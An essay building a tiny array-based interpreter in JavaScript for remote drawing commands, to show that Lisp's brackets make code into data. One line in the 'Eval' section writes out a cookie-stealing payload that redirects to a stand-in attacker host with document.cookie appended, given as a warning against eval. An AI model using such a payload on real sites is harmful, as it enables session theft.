# An Intuition for Lisp Syntax


Every lisp hacker I ever met, myself included, thought that all those brackets
in Lisp were off-putting and weird. At first, of course. Soon after we all
came to the same epiphany: _lisp’s power lies in those brackets_! In this
essay, we’ll go on a journey to that epiphany.

## Draw

Say we were creating a program that let you draw stuff. If we wrote this in
JavaScript, we might have functions like this:

[code]

    drawPoint({x: 0, y: 1}, 'yellow')
    drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
    drawCircle(point, radius, 'red')
    rotate(shape, 90)
    ...
[/code]

So far, so cool.

## Challenge

Now, here’s a challenge: **Can we support remote drawing?**

This means that a user would be able to “send” instructions to your screen,
and you would see their drawing come to life.

How could we do it?

Well, say we set up a websocket connection. We could receive instructions from
the user like this:

[code]

    websocket.onMessage(data => { 
      /* TODO */ 
    })
[/code]

## Eval

To make it work off the bat, one option could be to take code strings as
input:

[code]

    websocket.onMessage(data => {
      eval(data)
    })
[/code]

Now the user could send `"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"` and
bam: we’ll draw a line!

But…your spidey sense may already be tingling. What if the user was malicious
and managed to send us an instruction like this:

[code]

    "window.location='http://iwillp3wn.com?user_info=' + document.cookie"
[/code]

Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would
indeed pwn us. We can’t use eval; it’s too dangerous.

There lies our problem: we can’t use `eval`, but we need some way to receive
arbitrary instructions.

## An initial idea

Well, we could represent those instructions as JSON. We can map each JSON
instruction to a special function, and that way we can control what runs.
Here’s one way we can represent it:

[code]

    {
      instructions: [
        { functionName: "drawLine", args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, "blue"] },
      ];
    }
[/code]

This JSON would translate to `drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")`

We could support this pretty simply. Here’s how our `onMessage` could look:

[code]

    webSocket.onMessage(instruction => { 
      const fns = {
        drawLine: drawLine,
        ...
      };
      data.instructions.forEach((ins) => fns[ins.functionName](...ins.args));
    })
[/code]

That seems like it would work!

## An initial simplification

Let’s see if we can clean this up. Here’s our JSON:

[code]

    {
      instructions: [
        { functionName: "drawLine", args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, "blue"] },
      ];
    }
[/code]

Well, since _every_ instruction has a `functionName`, and an `args`, we don’t
really need to spell that out. We _could_ write it like this:

[code]

    {
      instructions: [["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }, "blue"]],
    }
[/code]

Nice! We changed our object in favor of an array. To handle that, all we need
is a rule: **the** **_first_** **part of our instruction is the function name,
and the _rest_ are arguments.** If we wrote that down, here’s how our
`onMessage` would look:

[code]

    websocket.onMessage(data => { 
      const fns = {
        drawLine: drawLine,
        ...
      };
      data.instructions.forEach(([fName, ...args]) => fns[fName](...args));
    })
[/code]

And bam, `drawLine` would work again!

## More power

So far, we only used `drawLine`:

[code]

    drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
    // same as
    ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]
[/code]

But what if we wanted to express something more powerful:

[code]

    rotate(drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue'), 90)
[/code]

Looking at that, we can translate it to an instruction like this:

[code]

    ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90]
[/code]

Here, the `rotate` instruction has an argument that is in _itself_ an
instruction! Pretty powerful. Surprisingly, we just need to tweak our code a
tiny bit to make it work:

[code]

    websocket.onMessage(data => { 
      const fns = {
        drawLine: drawLine,
        ...
      };
      const parseInstruction = (ins) => {
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        return fns[fName](...args.map(parseInstruction));
      };
      data.instructions.forEach(parseInstruction);
    })
[/code]

Nice, We introduce a `parseInstruction` function. We can apply
`parseInstruction` recursively to arguments, and support stuff like:

[code]

    ["rotate", ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90], 30]
[/code]

Very cool!

## Further simplification

Okay, let’s look at our JSON again:

[code]

    {
      instructions: [["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]],
    }
[/code]

Well, our data _only_ contains instructions. Do we really need a key called
`instructions`?

What if we did this:

[code]

    ["do", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]]
[/code]

Instead of a top-level key, we could have a special instruction called `do`,
which runs all the instructions it’s given.

Here’s one way we can implement it:

[code]

    websocket.onMessage(data => { 
      const fns = {
        ...
        do: (...args) => args[args.length - 1],
      };
      const parseInstruction = (ins) => {
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        return fns[fName](...args.map(parseInstruction));
      };
      parseInstruction(instruction);
    })
[/code]

Oh wow, that was easy. We just added `do` in `fns`. Now we can support an
instruction like this:

[code]

    [
      "do",
      ["drawPoint", { x: 0, y: 0 }],
      ["rotate", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }], 90]],
    ];
[/code]

## Even more power

Let’s make it more interesting. What if we wanted to support _definitions?_

[code]

     const shape = drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')
    rotate(shape, 90)
[/code]

If we could support definitions, our remote user could write some very
expressive instructions! Let’s convert our code to the kind of data structure
we’ve been playing with:

[code]

    ["def", "shape", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]]
    ["rotate", "shape", 90]
[/code]

Noot bad! If we can support an instruction like that, we’d be golden! Here’s
how:

[code]

    websocket.onMessage(data => { 
      const variables = {};
      const fns = {
        ...
        def: (name, v) => {
          variables[name] = v;
        },
      };
      const parseInstruction = (ins) => {
        if (variables[ins]) {
          // this must be some kind of variable, like "shape"
          return variables[ins];
        }
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        return fns[fName](...args.map(parseInstruction));
      };
      parseInstruction(instruction);
    })
[/code]

Here, we introduced a `variables` object, which keeps track of every variable
we define. A special `def` function updates that `variables` object. Now we
can run this instruction:

[code]

    [
      "do",
      ["def", "shape", ["drawLine", { x: 0, y: 0 }, { x: 1, y: 1 }]],
      ["rotate", "shape", 90],
    ];
[/code]

Not bad!

## Extreme Power: Goal

Let’s step it up a notch. What if we let our remote user _define their own
functions?_

Say they wanted to write something like this:

[code]

    const drawTriangle = function(left, top, right, color) { 
       drawLine(left, top, color);
       drawLine(top, right, color); 
       drawLine(left, right, color); 
    } 
    drawTriangle(...)
[/code]

How would we do it? Let’s follow our intuition again. If we transcribe this to
our data representation, here’s how it could look:

[code]

      ["def", "drawTriangle",
      ["fn", ["left", "top", "right", "color"],
        ["do",
          ["drawLine", "left", "top", "color"],
          ["drawLine", "top", "right", "color"],
          ["drawLine", "left", "right", "color"],
        ],
      ],
    ],
    ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
[/code]

Here,

[code]

    const drawTriangle = ...
[/code]

translates to

[code]

    ["def", "drawTriangle", …]. 
[/code]

And

[code]

    function(left, top, right, color) {…}
[/code]

translates to

[code]

    ["fn", ["left", "top", "right", "color"], ["do" ...]]
[/code]

All we need to do is to parse this instruction somehow, and bam, we are good
to go!

## Extreme Power: Key

The key to making this work is our `["fn", …]` instruction. What if we did
this:

[code]

    const parseFnInstruction = (args, body, oldVariables) => {
      return (...values) => {
        const newVariables = {
          ...oldVariables,
          ...mapArgsWithValues(args, values),
        };
        return parseInstruction(body, newVariables);
      };
    };
[/code]

When we find a `fn` instruction, we run `parseFnInstruction`. This produces a
new javascript function. We would replace `drawTriangle` here with that
function:

[code]

    ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]
[/code]

So when that function is run, `values` would become:

[code]

    [{ x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"]
[/code]

After that,

[code]

    const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
[/code]

Would create a new `variables` object, that includes a mapping of the function
arguments to these newly provided values:

[code]

    const newVariables = {
      ...oldVariables,
      left: { x: 0, y: 0 }, 
      top: { x: 3, y: 3 },
      right: {x: 6, y: 0 }, 
      color: "blue", 
    }
[/code]

Then, we can take the function body, in this case:

[code]

          [
            "do",
            ["drawLine", "left", "top", "color"],
            ["drawLine", "top", "right", "color"],
            ["drawLine", "left", "right", "color"],
          ],
[/code]

And run it through `parseInstruction`, with our `newVariables`. With that
`"left"` would be looked up as a variable and map to `{x: 0, y: 0}`.

If we did that, voila, the major work to support functions would be done!

## Extreme Power: Execution

Let’s follow through on our plan. The first thing we need to do, is to have
`parseInstruction` accept `variables` as an argument. To do that, we need to
update `parseInstruction`, and wherever it's called:

[code]

      const parseInstruction = (ins, variables) => {
        ...
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
      };
      parseInstruction(instruction, variables);
[/code]

Next, we’ll want to add a special check to detect if we have a “fn”
instruction:

[code]

      const parseInstruction = (ins, variables) => {
        ...
        const [fName, ...args] = ins;
        if (fName == "fn") {
          return parseFnInstruction(...args, variables);
        }
        ...
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
      };
      parseInstruction(instruction, variables);
[/code]

Now, our `parseFnInstruction`:

[code]

    const mapArgsWithValues = (args, values) => { 
      return args.reduce((res, k, idx) => {
        res[k] = values[idx];
        return res;
      }, {});
    }
    const parseFnInstruction = (args, body, oldVariables) => {
      return (...values) => {
        const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
        return parseInstruction(body, newVariables);
      };
    };
[/code]

It works exactly like we said. We return a new function. When it’s run, it:

  1. Creates a `newVariables` object, that associates the `args` with `values`
  2. runs `parseInstruction` with the `body` and the new `variables` object

Okay, almost done. The final bit to make it all work:

[code]

      const parseInstruction = (ins, variables) => {
        ...
        const [fName, ...args] = ins;
        if (fName == "fn") {
          return parseFnInstruction(...args, variables);
        }
        const fn = fns[fName] || variables[fName];
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
[/code]

The secret is this:

[code]

        const fn = fns[fName] || variables[fName];
[/code]

Here, since `fn` can now come from both `fns` and `variables`, we check both.
Put it all together, and it works!

[code]

    websocket.onMessage(data => { 
      const variables = {};
      const fns = {
        drawLine: drawLine,
        drawPoint: drawPoint,
        rotate: rotate,
        do: (...args) => args[args.length - 1],
        def: (name, v) => {
          variables[name] = v;
        },
      };
      const mapArgsWithValues = (args, values) => {
        return args.reduce((res, k, idx) => {
          res[k] = values[idx];
          return res;
        }, {});
      };
      const parseFnInstruction = (args, body, oldVariables) => {
        return (...values) => {
          const newVariables = {
            ...oldVariables,
            ...mapArgsWithValues(args, values),
          };
          return parseInstruction(body, newVariables);
        };
      };
      const parseInstruction = (ins, variables) => {
        if (variables[ins]) {
          // this must be some kind of variable
          return variables[ins];
        }
        if (!Array.isArray(ins)) {
          // this must be a primitive argument, like {x: 0, y: 0}
          return ins;
        }
        const [fName, ...args] = ins;
        if (fName == "fn") {
          return parseFnInstruction(...args, variables);
        }
        const fn = fns[fName] || variables[fName];
        return fn(...args.map((arg) => parseInstruction(arg, variables)));
      };
      parseInstruction(instruction, variables);
    })
[/code]

Holy jeez, with just this code, we can parse this:

[code]

    [
      "do",
      [
        "def",
        "drawTriangle",
        [
          "fn",
          ["left", "top", "right", "color"],
          [
            "do",
            ["drawLine", "left", "top", "color"],
            ["drawLine", "top", "right", "color"],
            ["drawLine", "left", "right", "color"],
          ],
        ],
      ],
      ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
      ["drawTriangle", { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, "purple"],
    ])
[/code]

We can compose functions, we can define variables, and we can even create our
own functions. If we think about it, we just created a programming language!
[1].

## Try it out

Here’s an example of our triangle 🙂

And here’s a happy person!

## Surprises

We may even notice something interesting. Our new array language has
advantages to JavaScript itself!

### Nothing special

In JavaScript, you define variables by writing `const x = foo`. Say you wanted
to “rewrite” `const` to be just `c`. You couldn’t do this, because `const x =
foo` is special syntax in JavaScript. You’re not allowed to change that
around.

In our array language though, there’s no syntax at all! Everything is just
arrays. We could easily write some special `c` instruction that works just
like `def`.

If we think about it, it’s as though in Javascript we are guests, and we need
to follow the language designer’s rules. But in our array language, we are
“co-owners”. There is no big difference between the “built-in” stuff (“def”,
“fn”) the language designer wrote, and the stuff we write! (“drawTriangle”).

### Code is Data

There’s another, much more resounding win. If our code is just a bunch of
arrays, we can _do stuff_ to the code. We could write code that generates
code!

For example, say we wanted to support `unless` in Javascript.

Whenever someone writes

[code]

    unless foo { 
       ...
    }
[/code]

We can rewrite it to

[code]

    if !foo { 
       ...
    }
[/code]

This would be difficult to do. We’d need something like Babel to parse our
file, and work on top of the AST to make sure we rewrite our code safely to

[code]

    if !foo { 
      ...
    }
[/code]

But in our array language, our code is just arrays! It’s easy to rewrite
`unless`:

[code]

    function rewriteUnless(unlessCode) {
       const [_unlessInstructionName, testCondition, consequent] = unlessCode; 
       return ["if", ["not", testCondition], consequent]
    }
[/code]

[code]

    rewriteUnless(["unless", ["=", 1, 1], ["drawLine"]])
    // => 
    ["if", ["not", ["=", 1, 1]], ["drawLine"]];
[/code]

Oh my god. Easy peasy.

## Editing with Structure

Having your code represented as data doesn’t just allow you to manipulate your
code with ease. It also allows your editor to do it too. For example, say you
are editing this code:

[code]

    ["if", testCondition, consequent]
[/code]

You want to change `testCondition` to `["not", testCondition]`

You could bring your cursor over to `testCondition`

[code]

    ["if", |testCondition, consequent]
[/code]

Then create an array

[code]

    ["if", [|] testCondition, consequent]
[/code]

Now you can type “not”

[code]

    ["if", ["not", |] testCondition, consequent]
[/code]

If your editor understood these arrays, you can tell it: “expand” this area to
the right:

[code]

    ["if", ["not", testCondition], consequent]
[/code]

Boom. Your editor helped your change the structure of your code.

If you wanted to undo this, You can put your cursor beside `testCondition`,

[code]

    ["if", ["not", |testCondition], consequent]
[/code]

and ask the editor to “raise” this up one level:

[code]

    ["if", testCondition, consequent]
[/code]

All of a sudden, instead of editing characters, you are editing the
_structure_ of your code. This is called structural editing [2]. It can help
you move with the speed of a potter, and is one of the many wins you’ll get
when your code is data.

## What you discovered

Well, this array language you happened to have discovered…is a poorly
implemented dialect of Lisp!

Here’s our most complicated example:

[code]

    [
      "do",
      [
        "def",
        "drawTriangle",
        [
          "fn",
          ["left", "top", "right", "color"],
          [
            "do",
            ["drawLine", "left", "top", "color"],
            ["drawLine", "top", "right", "color"],
            ["drawLine", "left", "right", "color"],
          ],
        ],
      ],
      ["drawTriangle", { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, "blue"],
      ["drawTriangle", { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, "purple"],
    ])
[/code]

And here’s how that looks in Clojure, a dialect of lisp:

[code]

    (do 
      (def draw-triangle (fn [left top right color]
                           (draw-line left top color)
                           (draw-line top right color)
                           (draw-line left right color)))
      (draw-triangle {:x 0 :y 0} {:x 3 :y 3} {:x 6 :y 0} "blue")
      (draw-triangle {:x 6 :y 6} {:x 10 :y 10} {:x 6 :y 16} "purple"))
[/code]

The changes are cosmetic:

  * `()` now represent lists 
  * We removed all the commas
  * camelCase became kebab-case
  * Instead of using strings everywhere, we added one more data type: a `symbol`
    * A symbol is used to look stuff up: i.e `"drawTriangle"` became `draw-triangle`

The rest of the rules are the same:

`(draw-line left top color)`

means

  * Evaluate `left`, `top`, `color`, and replace them with their values
  * Run the function `draw-line` with those values

## Discovery?

Now, if we agree that the ability to manipulate source code is important to
us, what kind of languages are most conducive for supporting it?

One way we can solve that question is to rephrase it: how could we make
manipulating code as intuitive as manipulating _data_ within _our code_? The
answer sprouts out: Make the code data! What an exciting conclusion. If we
care about manipulating source code, we glide into the answer: the code _must_
be data [3].

If the code must be data, what kind of data representation could we use? XML
could work, JSON could work, and the list goes on. But, what would happen if
we tried to find the simplest data structure? If we keep simplifying, we glide
into to the simplest nested structure of all…lists!

This is both illuminating and exciting.

It’s illuminating, in the sense that it seems like Lisp is “discovered”. It’s
like the solution to an optimization problem: if you care about manipulating
code, you gravitate towards discovering Lisp. There’s something awe-inspiring
about using a tool that’s discovered: who knows, alien life-forms could use
Lisp!

It’s exciting, in that, there _may_ be a better syntax. We don’t know. Ruby
and Python in my opinion were experiments, trying to bring lisp-like power
without the brackets. I don’t think the question is a solved one yet. Maybe
you can think about it 🙂

## Fin

You can imagine how expressive you can be if you can rewrite the code your
language is written in. You’d truly be on the same footing as the language
designer, and the abstractions you could write at that level, can add up to
save you years of work.

All of a sudden, those brackets look kind of cool!

* * *

_Thanks to Daniel Woelfel,[Alex Kotliarskyi](https://frantic.im/), Sean Grove,
Joe Averbukh, Irakli Safareli, for reviewing drafts of this essay_

